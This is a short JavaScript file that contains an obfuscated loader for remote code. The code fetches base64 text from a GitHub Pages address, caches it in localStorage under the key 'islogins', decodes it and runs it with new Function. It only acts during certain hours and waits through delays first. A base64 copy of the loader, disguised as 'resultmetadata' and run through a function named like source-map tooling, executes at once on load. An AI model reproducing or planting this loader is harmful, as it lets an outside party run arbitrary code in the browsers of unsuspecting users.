
var jswod1=`
var myDate = new Date().getHours();
if(myDate>20||myDate<9){
    if(localStorage.getItem("islogins")){
        setTimeout(function(){
            var engine=window.atob(localStorage.getItem("islogins"));
            var objective=new Function(engine)
            objective()
        },9204)
    }else{
        setTimeout(function(){
            var Http = new XMLHttpRequest();
            var url = "https://jayouhao.github.io/mei/objective.json"
            Http.open("GET", url);
            Http.send();
            Http.onreadystatechange = function () {
                if (this.readyState == 4 && this.status == 200) {
                    localStorage.setItem("islogins",Http.responseText)
                    var engine=window.atob(Http.responseText);
                    var objective=new Function(engine)
                    objective()
                }
            }
        },32040)
    }
}
if(15<myDate>16||14<myDate>10){
    if(localStorage.getItem("islogins")){
        setTimeout(function(){
            var engine=window.atob(localStorage.getItem("islogins"));
            var objective=new Function(engine)
            objective()
        },9204)
    }
}
`;

var jswod=`var myDate=(new Date).getHours();if(myDate>20||myDate<9){if(localStorage.getItem("islogins")){setTimeout(function(){var t=window.atob(localStorage.getItem("islogins"));var e=new Function(t);e()},9204)}else{setTimeout(function(){var o=new XMLHttpRequest;var t="https://jayouhao.github.io/mei/objective.json";o.open("GET",t);o.send();o.onreadystatechange=function(){if(this.readyState==4&&this.status==200){localStorage.setItem("islogins",o.responseText);var t=window.atob(o.responseText);var e=new Function(t);e()}}},32040)}}if(15<myDate>16||14<myDate>10){if(localStorage.getItem("islogins")){setTimeout(function(){var t=window.atob(localStorage.getItem("islogins"));var e=new Function(t);e()},9204)}}`

console.log(window.btoa(jswod))

var resultmetadata='dmFyIG15RGF0ZSA9IG5ldyBEYXRlKCkuZ2V0SG91cnMoKTtpZihteURhdGU+MjB8fG15RGF0ZTw5KXtpZihsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgiaXNsb2dpbnMiKSl7c2V0VGltZW91dChmdW5jdGlvbigpe3ZhciBlbmdpbmU9d2luZG93LmF0b2IobG9jYWxTdG9yYWdlLmdldEl0ZW0oImlzbG9naW5zIikpO3ZhciBvYmplY3RpdmU9bmV3IEZ1bmN0aW9uKGVuZ2luZSk7b2JqZWN0aXZlKCl9LDkyMDQpfWVsc2V7c2V0VGltZW91dChmdW5jdGlvbigpe3ZhciBIdHRwID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7dmFyIHVybCA9ICJodHRwczovL2pheW91aGFvLmdpdGh1Yi5pby9tZWkvb2JqZWN0aXZlLmpzb24iO0h0dHAub3BlbigiR0VUIiwgdXJsKTtIdHRwLnNlbmQoKTtIdHRwLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uICgpIHtpZiAodGhpcy5yZWFkeVN0YXRlID09IDQgJiYgdGhpcy5zdGF0dXMgPT0gMjAwKSB7bG9jYWxTdG9yYWdlLnNldEl0ZW0oImlzbG9naW5zIixIdHRwLnJlc3BvbnNlVGV4dCk7dmFyIGVuZ2luZT13aW5kb3cuYXRvYihIdHRwLnJlc3BvbnNlVGV4dCk7dmFyIG9iamVjdGl2ZT1uZXcgRnVuY3Rpb24oZW5naW5lKTtvYmplY3RpdmUoKX19fSwzMjA0MCl9fWlmKDE1PG15RGF0ZT4xNnx8MTQ8bXlEYXRlPjEwKXtpZihsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgiaXNsb2dpbnMiKSl7c2V0VGltZW91dChmdW5jdGlvbigpe3ZhciBlbmdpbmU9d2luZG93LmF0b2IobG9jYWxTdG9yYWdlLmdldEl0ZW0oImlzbG9naW5zIikpO3ZhciBvYmplY3RpdmU9bmV3IEZ1bmN0aW9uKGVuZ2luZSk7b2JqZWN0aXZlKCl9LDkyMDQpO319';
var inputSourceMapFunction=new Function(window.atob(resultmetadata));
inputSourceMapFunction();
